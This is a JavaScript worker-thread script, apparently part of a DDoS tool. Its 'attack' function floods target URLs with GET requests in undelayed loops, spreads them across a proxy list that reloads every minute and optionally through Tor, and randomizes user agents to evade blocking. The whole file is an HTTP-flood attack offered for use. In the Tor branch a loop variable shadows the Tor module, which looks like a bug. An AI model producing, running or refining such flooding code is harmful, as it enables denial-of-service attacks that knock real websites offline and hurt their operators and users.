const proxy =         require('tor-request');
const request =       require('request');   
const fs = require('fs').promises;  
const randomUseragent = require('random-useragent');
const {
     parentPort, workerData
  } =                   require('worker_threads');
const { urls, tor } = workerData;

(async () => {
    let proxyList = new Set((await fs.readFile('proxy.txt', 'utf8')).split('\n'));

    setInterval(async () => {
        proxyList = new Set((await fs.readFile('proxy.txt', 'utf8')).split('\n'));
    }, 60000);

    const attack = (method, url, proxy) => {
        try {
            const params = {
                url,
                method: 'GET',
                headers: {
                    'User-Agent': randomUseragent.getRandom()
                }
            };
    
            if (proxy) params.proxy = `http://${proxy}`;
    
            method(params, (err, res) => {
                if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
            });
        } catch(err) {}
    }
    
    if (tor) {
        setInterval(() => {
            for (const url of urls) {
                attack(proxy.request, url);

                for (const proxy of proxyList) {
                    attack(proxy.request, url, proxy);
                }
            };
        });
    } else {
        setInterval(() => {
            for (const url of urls) {
                attack(request, url);

                for (const proxy of proxyList) {
                    attack(request, url, proxy);
                }
            }
        });
    }
})()

